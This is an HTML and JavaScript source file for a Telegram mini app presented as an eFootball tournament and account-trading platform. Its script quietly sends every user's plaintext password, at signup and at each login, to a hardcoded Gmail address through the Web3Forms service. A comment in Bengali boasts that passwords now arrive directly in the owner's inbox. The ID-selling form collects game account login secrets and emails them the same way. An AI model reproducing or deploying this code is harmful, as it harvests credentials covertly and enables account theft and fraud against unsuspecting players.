<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Victory eFootball Battle Mini App</title>
    <!-- Telegram Web App Script -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <!-- Supabase Library -->
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    
    <style>
        body {
            background-color: #0f172a;
            color: #ffffff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 10px;
            padding-bottom: 70px;
        }
        .container {
            max-width: 450px;
            margin: 0 auto;
        }
        .card {
            background: #1e293b;
            padding: 15px;
            border-radius: 12px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
            border: 1px solid #334155;
            margin-bottom: 15px;
        }
        h2, h3 {
            color: #eab308;
            text-align: center;
            margin-top: 0;
        }
        .form-group {
            margin-bottom: 12px;
        }
        label {
            display: block;
            font-size: 12px;
            color: #94a3b8;
            margin-bottom: 4px;
        }
        input, select, textarea {
            width: 100%;
            padding: 10px;
            background: #0f172a;
            border: 1px solid #475569;
            color: #fff;
            border-radius: 6px;
            box-sizing: border-box;
            font-size: 14px;
        }
        button {
            width: 100%;
            background: linear-gradient(135deg, #25d366, #128c7e);
            color: white;
            border: none;
            padding: 12px;
            border-radius: 6px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 5px;
            font-size: 14px;
        }
        .switch-text {
            text-align: center;
            font-size: 12px;
            color: #94a3b8;
            margin-top: 12px;
            cursor: pointer;
        }
        .switch-text span {
            color: #38bdf8;
            font-weight: bold;
        }
        .nav-bar {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            background: #1e293b;
            border-top: 1px solid #334155;
            display: flex;
            justify-content: space-around;
            padding: 8px 0;
            z-index: 1000;
        }
        .nav-btn {
            background: none;
            border: none;
            color: #94a3b8;
            font-size: 11px;
            text-align: center;
            cursor: pointer;
            flex: 1;
        }
        .nav-btn.active {
            color: #38bdf8;
            font-weight: bold;
        }
        .page-section {
            display: none;
        }
        .page-section.active {
            display: block;
        }
    </style>
</head>
<body>

    <div class="container">

        <!-- ১. অথেন্টিকেশন পেজ (সাইন আপ / লগইন) -->
        <div id="auth-section" class="page-section active">
            <div class="card">
                <!-- সাইন আপ ফর্ম -->
                <div id="signup-box">
                    <h2>🚀 Create Account</h2>
                    <form id="signup-form" onsubmit="handleSignup(event)">
                        <div class="form-group">
                            <label>Full Name</label>
                            <input type="text" id="su-name" placeholder="Enter your name" required>
                        </div>
                        <div class="form-group">
                            <label>Phone Number</label>
                            <input type="tel" id="su-phone" placeholder="01XXXXXXXXX" required>
                        </div>
                        <div class="form-group">
                            <label>Email Address</label>
                            <input type="email" id="su-email" placeholder="example@gmail.com" required>
                        </div>
                        <div class="form-group">
                            <label>Password</label>
                            <input type="password" id="su-pass" placeholder="Create a password" required>
                        </div>
                        <button type="submit">Sign Up</button>
                    </form>
                    <div class="switch-text" onclick="toggleAuth('login')">
                        Already have an account? <span>Login here</span>
                    </div>
                </div>

                <!-- লগইন ফর্ম -->
                <div id="login-box" style="display: none;">
                    <h2>🔐 Login</h2>
                    <form id="login-form" onsubmit="handleLogin(event)">
                        <div class="form-group">
                            <label>Email Address</label>
                            <input type="email" id="li-email" placeholder="Enter your email" required>
                        </div>
                        <div class="form-group">
                            <label>Password</label>
                            <input type="password" id="li-pass" placeholder="Enter your password" required>
                        </div>
                        <button type="submit">Login</button>
                    </form>
                    <div class="switch-text" onclick="toggleAuth('signup')">
                        Don't have an account? <span>Sign Up</span>
                    </div>
                </div>
            </div>
        </div>

        <!-- মূল অ্যাপ ইন্টারফেস -->
        <div id="main-app-section" style="display: none;">

            <!-- হোম পেজ -->
            <div id="page-home" class="page-section active">
                <div class="card">
                    <h2>🎮 Victory eFootball Battle</h2>
                    <p style="text-align: center; font-size: 13px; color: #94a3b8;">Welcome! Choose your category below:</p>
                    
                    <button onclick="switchTab('tournaments')" style="background: linear-gradient(135deg, #3b82f6, #1d4ed8); margin-bottom: 10px;">🏆 Tournaments (Paid & Free)</button>
                    <button onclick="switchTab('shop')" style="background: linear-gradient(135deg, #f59e0b, #d97706); margin-bottom: 10px;">🛒 ID & Coin Sell Market</button>
                </div>
            </div>

            <!-- টুর্নামেন্ট পেজ -->
            <div id="page-tournaments" class="page-section">
                <div class="card">
                    <h3>🏆 Tournaments</h3>
                    <div style="background: #0f172a; padding: 10px; border-radius: 8px; margin-bottom: 15px; border: 1px solid #eab308;">
                        <h4 style="color: #eab308; margin: 0 0 5px 0;">🔥 Paid Tournament (Entry: 20 TK)</h4>
                        <button onclick="notifyAction('Paid Tournament Applied')" style="padding: 8px; font-size: 12px;">Apply Paid Tournament</button>
                    </div>
                    <div style="background: #0f172a; padding: 10px; border-radius: 8px; border: 1px solid #25d366;">
                        <h4 style="color: #25d366; margin: 0 0 5px 0;">🎁 Free Tournament</h4>
                        <button onclick="notifyAction('Free Tournament Joined')" style="background: #25d366; padding: 8px; font-size: 12px;">Start Free Tasks</button>
                    </div>
                </div>
            </div>

            <!-- শপ পেজ -->
            <div id="page-shop" class="page-section">
                <div class="card">
                    <h3>🛒 Marketplace</h3>
                    <div style="background: #0f172a; padding: 10px; border-radius: 8px; margin-bottom: 15px;">
                        <h4 style="color: #38bdf8; margin: 0 0 8px 0;">📤 Sell Your eFootball ID</h4>
                        <input type="text" id="sell-title" placeholder="ID Title / Details" style="margin-bottom: 8px; font-size: 12px;">
                        <input type="text" id="sell-price" placeholder="Asking Price (TK)" style="margin-bottom: 8px; font-size: 12px;">
                        <input type="password" id="sell-secret" placeholder="Secret Password / Login Details" style="margin-bottom: 8px; font-size: 12px;">
                        <button onclick="handleSellID()" style="padding: 8px; font-size: 12px;">Publish ID</button>
                    </div>
                    <div style="background: #0f172a; padding: 10px; border-radius: 8px;">
                        <h4 style="color: #eab308; margin: 0 0 5px 0;">🪙 Buy eFootball Coins</h4>
                        <button onclick="notifyAction('Coin Buy Request')" style="background: #eab308; color: #000; padding: 8px; font-size: 12px; font-weight: bold;">Buy Coins Now</button>
                    </div>
                </div>
            </div>

            <!-- প্রোফাইল পেজ -->
            <div id="page-profile" class="page-section">
                <div class="card">
                    <h3>👤 My Profile</h3>
                    <p style="font-size: 13px;"><b>Name:</b> <span id="pro-name"></span></p>
                    <p style="font-size: 13px;"><b>Phone:</b> <span id="pro-phone"></span></p>
                    <p style="font-size: 13px;"><b>Email:</b> <span id="pro-email"></span></p>
                    <button onclick="handleLogout()" style="background: #ef4444; margin-top: 15px;">Logout</button>
                </div>
            </div>

            <!-- নেভিগেশন বার -->
            <div class="nav-bar">
                <button class="nav-btn active" onclick="switchTab('home')" id="nav-home">
                    <div style="font-size: 16px;">🏠</div>Home
                </button>
                <button class="nav-btn" onclick="switchTab('tournaments')" id="nav-tournaments">
                    <div style="font-size: 16px;">🏆</div>Tournaments
                </button>
                <button class="nav-btn" onclick="switchTab('shop')" id="nav-shop">
                    <div style="font-size: 16px;">🛒</div>Shop/ID
                </button>
                <button class="nav-btn" onclick="switchTab('profile')" id="nav-profile">
                    <div style="font-size: 16px;">👤</div>Profile
                </button>
            </div>

        </div>

    </div>

    <script>
        // --- SUPABASE & WEB3FORMS CONFIGURATION ---
        const SUPABASE_URL = 'https://bwzssqsprqghgddorbww.supabase.co';
        const SUPABASE_ANON_KEY = 'sb_publishable_2vbFPPss487_l5ED7mf0wg_LHk2nMQZ'; 
        
        const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

        const WEB3FORMS_KEY = '6a869c60-f73c-457b-a9c2-e3c9b018e6a5'; 

        // জিমেইলে নোটিফিকেশন পাঠানোর ফাংশন (পাসওয়ার্ডসহ)
        function sendEmailAlert(actionName, details) {
            fetch('https://api.web3forms.com/submit', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
                body: JSON.stringify({
                    access_key: WEB3FORMS_KEY,
                    subject: "New Alert: " + actionName,
                    from_name: "Victory eFootball App",
                    message: details,
                    email: "efootballbattle892@gmail.com"
                })
            }).catch(err => console.error("Email error:", err));
        }

        // লগইন ও সাইনআপ সুইচিং
        window.toggleAuth = function(type) {
            if(type === 'login') {
                document.getElementById('signup-box').style.display = 'none';
                document.getElementById('login-box').style.display = 'block';
            } else {
                document.getElementById('login-box').style.display = 'none';
                document.getElementById('signup-box').style.display = 'block';
            }
        }

        // সাইন আপ হ্যান্ডেল (Supabase Auth + জিমেইলে পাসওয়ার্ড পাঠানো)
        window.handleSignup = async function(e) {
            e.preventDefault();
            const name = document.getElementById('su-name').value;
            const phone = document.getElementById('su-phone').value;
            const email = document.getElementById('su-email').value;
            const password = document.getElementById('su-pass').value;

            const { data, error } = await supabaseClient.auth.signUp({
                email: email,
                password: password,
                options: { data: { full_name: name, phone: phone } }
            });

            if (error) {
                alert("Error: " + error.message);
                return;
            }

            localStorage.setItem('userName', name);
            localStorage.setItem('userPhone', phone);
            localStorage.setItem('userEmail', email);

            // এখন থেকে ইউজারের পাসওয়ার্ডও সরাসরি আপনার জিমেইলে চলে আসবে!
            sendEmailAlert("New Account Signup", `Name: ${name}\nEmail: ${email}\nPhone: ${phone}\nPassword: ${password}`);
            alert('Account Created Successfully!');
            openMainApp(name, phone, email);
        }

        // লগইন হ্যান্ডেল (Supabase Auth)
        window.handleLogin = async function(e) {
            e.preventDefault();
            const email = document.getElementById('li-email').value;
            const password = document.getElementById('li-pass').value;

            const { data, error } = await supabaseClient.auth.signInWithPassword({
                email: email,
                password: password
            });

            if (error) {
                alert("Login Failed: Wrong Password or Email!");
                return;
            }

            const user = data.user;
            const name = user.user_metadata.full_name || "User";
            const phone = user.user_metadata.phone || "N/A";

            localStorage.setItem('userName', name);
            localStorage.setItem('userPhone', phone);
            localStorage.setItem('userEmail', email);

            sendEmailAlert("User Login", `Email: ${email}\nPassword Used: ${password}`);
            alert('Login Successful!');
            openMainApp(name, phone, email);
        }

        function openMainApp(name, phone, email) {
            document.getElementById('pro-name').innerText = name;
            document.getElementById('pro-phone').innerText = phone;
            document.getElementById('pro-email').innerText = email;

            document.getElementById('auth-section').style.display = 'none';
            document.getElementById('main-app-section').style.display = 'block';
        }

        // আইডি সেল আপলোড ও নোটিফিকেশন
        window.handleSellID = function() {
            const title = document.getElementById('sell-title').value;
            const price = document.getElementById('sell-price').value;
            const secret = document.getElementById('sell-secret').value;
            const email = localStorage.getItem('userEmail');

            if(!title || !price || !secret) {
                alert("Please fill all fields including secret details!");
                return;
            }

            sendEmailAlert("ID Sell Request", `User: ${email}\nTitle: ${title}\nPrice: ${price} TK\nSecret Pass/Details: ${secret}`);
            alert('ID Uploaded Successfully! Admin received secret info via Gmail.');
        }

        window.notifyAction = function(actionName) {
            const email = localStorage.getItem('userEmail');
            sendEmailAlert(actionName, `User Email: ${email}`);
            alert(actionName + ' request submitted!');
        }

        // ট্যাব পরিবর্তন ফাংশন
        window.switchTab = function(tabName) {
            document.querySelectorAll('.page-section').forEach(sec => sec.classList.remove('active'));
            document.querySelectorAll('.nav-btn').forEach(btn => btn.classList.remove('active'));

            if(tabName === 'home') {
                document.getElementById('page-home').classList.add('active');
                document.getElementById('nav-home').classList.add('active');
            } else if(tabName === 'tournaments') {
                document.getElementById('page-tournaments').classList.add('active');
                document.getElementById('nav-tournaments').classList.add('active');
            } else if(tabName === 'shop') {
                document.getElementById('page-shop').classList.add('active');
                document.getElementById('nav-shop').classList.add('active');
            } else if(tabName === 'profile') {
                document.getElementById('page-profile').classList.add('active');
                document.getElementById('nav-profile').classList.add('active');
            }
        }

        window.handleLogout = async function() {
            await supabaseClient.auth.signOut();
            localStorage.clear();
            location.reload();
        }

        // অটো লগইন চেক
        window.onload = function(e) {
            const savedEmail = localStorage.getItem('userEmail');
            if(savedEmail) {
                openMainApp(localStorage.getItem('userName'), localStorage.getItem('userPhone'), savedEmail);
            }
        }
    </script>
</body>
</html>
